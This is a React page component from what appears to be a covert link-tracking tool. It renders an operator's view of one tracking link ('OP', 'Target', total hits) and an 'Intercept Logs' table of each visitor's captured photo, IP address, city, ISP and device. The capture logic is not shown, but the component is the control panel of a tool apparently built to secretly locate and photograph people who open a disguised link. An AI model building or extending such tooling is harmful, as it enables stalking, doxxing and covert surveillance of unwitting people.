import { useRoute } from "wouter";
import { useGetLink, useGetLinkLogs, getGetLinkQueryKey, getGetLinkLogsQueryKey } from "@workspace/api-client-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { MapPin, Globe, Laptop, Clock, Camera } from "lucide-react";
import { AspectRatio } from "@/components/ui/aspect-ratio";

export default function LinkDetail() {
  const [, params] = useRoute("/links/:id");
  const id = parseInt(params?.id || "0", 10);

  const { data: link, isLoading: linkLoading } = useGetLink(id, { query: { enabled: !!id, queryKey: getGetLinkQueryKey(id) } });
  const { data: logs, isLoading: logsLoading } = useGetLinkLogs(id, { query: { enabled: !!id, queryKey: getGetLinkLogsQueryKey(id) } });

  if (linkLoading || logsLoading) {
    return <div className="text-primary animate-pulse tracking-widest">ACCESSING ARCHIVES...</div>;
  }

  if (!link) {
    return <div className="text-destructive uppercase tracking-widest font-bold">Error: Target not found</div>;
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex justify-between items-end border-b border-border pb-4">
        <div>
          <h1 className="text-2xl font-bold tracking-widest text-primary uppercase">OP: {link.name}</h1>
          <p className="text-muted-foreground text-sm mt-1 font-mono">/t/{link.token}</p>
        </div>
        <div className="text-right">
          <div className="text-3xl font-bold text-foreground">{link.visitCount}</div>
          <div className="text-xs text-primary tracking-widest uppercase">Total Hits</div>
        </div>
      </div>

      <Card className="bg-card border-border rounded-sm">
        <CardHeader className="border-b border-border bg-secondary/50">
          <CardTitle className="text-sm tracking-widest uppercase">Target Details</CardTitle>
        </CardHeader>
        <CardContent className="p-6 font-mono text-sm grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <span className="text-muted-foreground uppercase block text-xs mb-1">Created</span>
            {new Date(link.createdAt).toLocaleString()}
          </div>
          <div>
            <span className="text-muted-foreground uppercase block text-xs mb-1">Redirect</span>
            {link.redirectUrl || "None (Blank Page)"}
          </div>
        </CardContent>
      </Card>

      <div className="space-y-4">
        <h2 className="text-lg font-bold tracking-widest text-primary uppercase">Intercept Logs</h2>
        
        <Card className="bg-card border-border rounded-sm overflow-hidden">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="bg-secondary/50">
                <TableRow className="border-border hover:bg-transparent">
                  <TableHead className="w-16 text-muted-foreground uppercase tracking-wider text-xs">IMG</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">IP / Location</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">Device</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs text-right">Time</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {logs?.length === 0 ? (
                  <TableRow className="border-border hover:bg-transparent">
                    <TableCell colSpan={4} className="h-32 text-center text-muted-foreground uppercase tracking-widest">
                      No logs captured yet
                    </TableCell>
                  </TableRow>
                ) : (
                  logs?.map((log) => (
                    <TableRow key={log.id} className="border-border border-b hover:bg-secondary/30 transition-colors group">
                      <TableCell className="p-4">
                        <div className="w-12 h-12 bg-secondary border border-border rounded-sm overflow-hidden flex items-center justify-center">
                          {log.photo ? (
                            <img src={log.photo} alt="Capture" className="w-full h-full object-cover group-hover:scale-110 transition-transform" />
                          ) : (
                            <Camera className="w-4 h-4 text-muted-foreground opacity-50" />
                          )}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono">
                        <div className="font-bold text-foreground mb-1">{log.ip}</div>
                        <div className="text-xs text-muted-foreground flex items-center gap-1 truncate max-w-[200px]">
                          <MapPin className="w-3 h-3" />
                          {log.city ? `${log.city}, ${log.country}` : "Unknown Location"}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-xs">
                        <div className="flex items-center gap-1 text-muted-foreground mb-1 truncate max-w-[250px]">
                          <Laptop className="w-3 h-3" />
                          {log.userAgent || "Unknown Device"}
                        </div>
                        <div className="flex items-center gap-1 text-muted-foreground">
                          <Globe className="w-3 h-3" />
                          {log.isp || log.org || "Unknown ISP"}
                        </div>
                      </TableCell>
                      <TableCell className="text-right font-mono text-xs text-muted-foreground">
                        <div className="flex flex-col items-end gap-1">
                          <span className="flex items-center gap-1"><Clock className="w-3 h-3" /> {new Date(log.createdAt).toLocaleDateString()}</span>
                          <span>{new Date(log.createdAt).toLocaleTimeString()}</span>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </div>
    </div>
  );
}